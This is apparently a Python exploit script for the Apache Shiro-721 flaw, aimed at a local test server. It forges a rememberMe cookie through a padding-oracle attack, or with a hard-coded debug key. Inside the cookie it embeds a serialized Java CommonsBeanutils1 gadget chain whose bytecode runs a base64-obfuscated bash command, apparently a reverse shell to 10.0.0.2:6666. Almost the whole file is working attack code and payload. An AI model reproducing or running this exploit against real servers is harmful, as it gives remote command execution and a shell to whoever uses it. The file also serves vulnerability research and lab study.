#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# @Author  :    nob1ock
# @Date    :    2024-12-03
# @Description: 通过padding oracle attack加密恶意payload，利用Shiro721实现RCE

import base64
import time
import requests
from forge_plain import encrypt_ciphertext
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def exp(cookie, payload, decrypt_func):
    cipher = base64.b64decode(cookie)
    iv = cipher[0:16]
    cipher = cipher[16:]
    payload = base64.b64decode(payload)

    # 将自定义解密函数传给padding oracle加密函数
    # encrypt_ciphertext()是通过padding oracle加密数据的函数
    new_iv, new_ciphertext = encrypt_ciphertext(cipher, payload, iv, decrypt_func=decrypt_func)
    remember_me = base64.b64encode(new_iv + new_ciphertext)
    print("rememberMe: " + remember_me.decode('utf-8'))


if __name__ == '__main__':
    start_time = time.time()
    # debug获取的shiro服务器的密钥
    key = base64.b64decode('3UFc6FL7f+wA/bAwPQ16lw==')
    # 模拟shiro服务器解密函数
    def decrypt_func(ciphertext: bytes, iv) -> bytes:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted


    def decrypt_by_http(ciphertext, iv):
        remember_me = cookie + base64.b64encode(iv + ciphertext).decode('utf-8')
        url = 'http://127.0.0.1:8090/'
        headers = {'Cookie': f'rememberMe={remember_me}'}
        response = requests.get(url, headers=headers)
        if 'rememberMe=deleteMe' in response.headers.get('Set-Cookie'):
            raise ValueError('BadPadding')

    # 切分获得的Cookie rememberMe值，获得初始向量和密钥
    cookie = 'IB/1yAuJ4yvmRDjFjPTbEf6hioNZ2IOLKHwMRgExG90yjDvOdlMFE8I383gvMsnlNoeifENub0ISOviQdW0/Ipp5RwnNBP+SO2bsTV2se7cHd3rgMB9tGCpeuQ0ILOPUZV3rW1udMEJxxaCHGbMc5uG2AnpfF+0l4JO7tSAO+p2klIEqZ89180UDQwWsG4o1AouldFOGQt4+YEc8nSps1HyWxND6bDVJpQWGOEYuBau8d9rRDVuxZIV2u+NuhG+w6EJjJh5ArMOueca78xDYk5hKhaDQ7lEDZ4BpfkW2YKV8me4wjiRQCvJtmmsWoMnTiKEz75tghyMnLJVlFz/AmgmiY/QTr9vwLfJ6B+kViEFH5wBU8WIMMLjev6dhLfa0Y01bbJ+IAv4r4TbGCEIB7Vdeepu/e0RbqL92izqG7HZ8/eKBhE9rPkhGMR8IVKCF28bbTPmtG2onNMTpU3PJGuhvO4QBE6Io8ouuGB5YuwlLobM8Ov0ZUI2LUJI8aRhqqoV0TeRVrCAkl9Kf6IXCKU3ePuPciWazwSJ7c8LqfRdhBESeuyqzUQMySvpFRiNY'
    # 此处是Java恶意序列化数据，CB1链
    payload = 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAnamF2YS51dGlsLkNvbGxlY3Rpb25zJFJldmVyc2VDb21wYXJhdG9yZASK8FNOStACAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABxDK/rq+AAAANABECgAMACgHACkIACoIACsIACwKAC0ALgoALQAvCQAwADEIADIKADMANAcANQcANgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTGNvbS9zaGlyb3BheWxvYWQvc2hpcm81NTAvRXZpbFRlbXBsYXRlSW1wbDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcANwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQAHY29tbWFuZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwcAOAEAClNvdXJjZUZpbGUBABVFdmlsVGVtcGxhdGVJbXBsLmphdmEMAB8AIAEAEGphdmEvbGFuZy9TdHJpbmcBAAkvYmluL2Jhc2gBAAItYwEAVWVjaG8gTDJKcGJpOWlZWE5vSUMxcGNDQStKaUF2WkdWMkwzUmpjQzh4TUM0d0xqQXVNaTgyTmpZMklEQStKakU9IHwgYmFzZTY0IC1kIHwgYmFzaCAHADkMADoAOwwAPAA9BwA+DAA/AEABABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwBBDABCAEMBACpjb20vc2hpcm9wYXlsb2FkL3NoaXJvNTUwL0V2aWxUZW1wbGF0ZUltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACwAMAAAAAAADAAEADQAOAAIADwAAAD8AAAADAAAAAbEAAAACABAAAAAGAAEAAAATABEAAAAgAAMAAAABABIAEwAAAAAAAQAUABUAAQAAAAEAFgAXAAIAGAAAAAQAAQAZAAEADQAaAAIADwAAAEkAAAAEAAAAAbEAAAACABAAAAAGAAEAAAAVABEAAAAqAAQAAAABABIAEwAAAAAAAQAUABUAAQAAAAEAGwAcAAIAAAABAB0AHgADABgAAAAEAAEAGQABAB8AIAACAA8AAAB3AAQAAwAAACkqtwABBr0AAlkDEgNTWQQSBFNZBRIFU0y4AAYrtgAHTbIACBIJtgAKsQAAAAIAEAAAABYABQAAABcABAAYABgAGQAgABoAKAAbABEAAAAgAAMAAAApABIAEwAAABgAEQAhACIAAQAgAAkAIwAkAAIAGAAAAAQAAQAlAAEAJgAAAAIAJ3B0ABBFdmlsVGVtcGxhdGVJbXBscHcBAHhxAH4ADXg='

    exp(cookie, payload, decrypt_func)

    end_time = time.time()
    print(end_time - start_time)